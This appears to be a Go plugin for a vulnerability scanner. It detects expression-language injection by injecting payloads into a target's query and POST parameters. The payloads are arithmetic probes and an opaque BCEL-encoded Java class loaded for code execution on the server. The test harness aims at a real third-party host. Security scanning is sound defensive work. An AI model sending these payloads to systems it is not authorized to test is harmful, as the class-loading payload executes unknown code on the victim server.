/*
url
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	InitDnsCache = zhttp.SetDnsCache
	payloads     = [][]string{
		{"${7777*7777*7777}", "470366406433"},
		{"%{7777*7777*7777}", "470366406433"},
		{"7777*7777*7777", "470366406433"},
		{"T(java.lang.Class).forName('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dTm$5b$gG$U$3d$p$e0$$$cb$aa$88$sf$db$a6$b5$_I$d5D$88$a8$a8hS$N$d1$s$RM$hl$adI$df$96e$c0$d5u$97$ce$$$9a$fc$a2$7e$ce$X$d2$t$7d$da$l$d0$3f$94oyz$87$85$KJ$9e$96$P3$b3$e7$9e$7b$ee$99$3b$c3$fc$fd$f6$f5_$A$b2$a8hH$60F$c1$z$N$D$98$d1p$h$b3rH$ab$c8h$b8$839$VY$F$f3$g$e2XP$b0$a8$n$87$r$V$cb$wVd$5e$5e$c5$aa$M$adi$f8$Cw$e5$f0$a5$8au$V$h$K$eeI$bc$a0$e2$be$8aM$V$5b$w$beR$f1$40$c5C$V$8f$Ul$x$u2$M$ae$d9$ae$j$dce$88LM$7f$c7$Q$zx$V$ce0R$b4$5d$be$db8$vs$b1g$96$jB$d45$cbi3$87J$81i$j$ef$98$f5V$88$84$Y$b4$92$d7$Q$W$df$b2$ru$a1$b0$9c$5bZ$c8$cee$ef$y$e7$b2$x$8b$xK$e9$p$f3$d4$9c$ac$K$efdr$87$9fx$e2$c5C$b7$de$I$k$R$u$T$k$97$8f$b8$V$e8$f8$Y$9f0$5c$95$d4$8cc$ba$b5L$v$Q$b6$5b$bb$d7$a8V$b9P$b0$a3c$X$8fu$7c$8do$Y$d6$3cQK$fbu$Z$af$K$f3$84$9fy$e28$7d$c6$cbi$cbs$D$fe$3cH$L$fek$83$fbA$faI8$XB$f8$81$e7T$a4$d6$T$j$r$ec1$8c$d7x$d0fl$ET$ad$dc$I$b8O$9b$3f$f7PpL$df$d7$f1$z$a85$c9s8$b4$ac$60_$c7$f78$60X$ff$bf$7eJ$5c$9c$3a$7d$8bj$e7$5et$3c$c53$GEt$3e$7f$c0$8f$K$7e$d2$f13$7e$d1a$a2L$a7$n$b8_$f7$5c$9f$ba$3d$ec$f3p$7fn$b0$f7$a2$ce$7b$7c$86$z$d4aI$ff$9at$92$a9$3b$a6$ed$d2$d6e$d6$a1$vL$x$e0b$d3$b5$bc$K$R$Zb$8d$a0$3a$bb$cc$Q$t7$fb$c2$a6$YagrA$b3$e5x$b2$a0v$e4sk$$$3b$bf$b0$98c$Y$3b$_$b6$f9$dc$e2$f5$c0$f6H$3dy$f1$G$f4$b8$da$3b$U$dc$ac$d0$3d$b2$gBH$db$ed$ef$f1$a9$e9$e2E$d6$w$c3$95$g$ef$i$60$eb8$8a$9eY$91$be$8c$kzWH$e6$f4$N$d0$be$iZ$b4$Q$86$hS$c5$8b$9dZ$bd$a4$b8$g$f6b$87$H$87$kY$5c$ef$93$f3$ecRN$b7$8a$e0U$87$eeJ$sT$m$b9k$ef$8a$d1$7f$d1vO$bdcj$f1Jw$99$f0$b2$f5$94iC$d3$97$n$ba$g$b2$5d$e1$O$c7$$w$88$II$o$dc$e7$96c$K$5e$d9$b2$b9C$85g$ff$a3$V$j$a3$z$3aIL$bc$pDgJ$f7j$c3$b2$b8$ef$db$adg$p$3a$f5T$3e$x$R$aa$c9p$b3$cf$b6$fa$eea$b4$cbb$d8$iz$j$s$e9$ad$93$bf$B0$f9V$d0$f8$v$7d$5d$a7$99$d1$i$9by$F$f6$92$W$M$9f$d18$d8$C$a9$h$b8$d1$a1$b2$g$a1$a34$_$ff$81$81$83W$88l$ff$8eh$T$b1$d4$60$TJ$f1VJ$8d$fc$89x$T$da$cemF$abD$T$fan$9b0D$84$7c$d4$88$a6$86$db$94$7c$cc$88$cd$b6I$f9A$83$EFR$c9$sF$f3$8a$a1PF$caP$q6$96W$NU$86$c6e$un$c4$5b$a1$b8$c4$c6$f2$9a$a1$c9$d0$95$u$v$kD$c6p$b5$d4$c4D$3ea$q$M$8d$a0$c4A$qu$8d$Q$7d$3f$a4$Z$bd4$dd$d0$ff$a5$bd$d7E$7b$3f$f47$91$l2$86$M$adcp$d8$Y$96$c1$Pz5FB$f4z$t$ri$Q$d2$d6$fc0$d4L$g$c3m$8d$fd$df$Q$dd$7e$v$7b$ca$e6Y$O$l$d1$ntw$f9$s$8dq$M$bca9$F$9fK$60$aauN$d3$ff$A$96$faY$n$e1$G$A$A',true,new%20com.sun.org.apache.bcel.internal.util.ClassLoader())", "jsec123456"},
	}
)

func Verify(params engine.Params) (result engine.Result) {
	var err error
	// GET
	for _, payload := range payloads {
		for _, query := range util.GetReplacedPayloadList(params.ParsedTarget.Query(), payload[0], nil, false) {
			params.ParsedTarget.RawQuery = query
			result, err = checkVul(params, payload[1])
			if err != nil || result.Vul {
				return
			}
		}
	}
	// POST
	if params.Data != "" {
		dataQuery, err := url.ParseQuery(params.Data)
		if err != nil {
			return
		}
		for _, payload := range payloads {
			for _, data := range util.GetReplacedPayloadList(dataQuery, payload[0], nil, false) {
				params.Data = data
				result, err = checkVul(params, payload[1])
				if err != nil || result.Vul {
					return
				}
			}
		}
	}
	return
}

func checkVul(params engine.Params, vulStr string) (result engine.Result, err error) {
	var resp *zhttp.Response
	resp, err = zhttp.Request(params.Method, params.ParsedTarget.String(), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		Hosts:              params.Hosts,
		RawCookie:          params.Cookie,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
		RawData:            params.Data,
		ContentType:        params.ContentType,
	})
	if err != nil {
		return
	}
	body := resp.String()
	resp.Close()
	if strings.Contains(body, vulStr) {
		result.Vul = true
		result.VulUrl = params.ParsedTarget.String()
		result.RawReq = resp.RawRequest()
		result.VulInfo = "通用表达式执行"
		return
	}
	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://voice.jd.com/?a=1&b=2&pt_key=;sid="
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
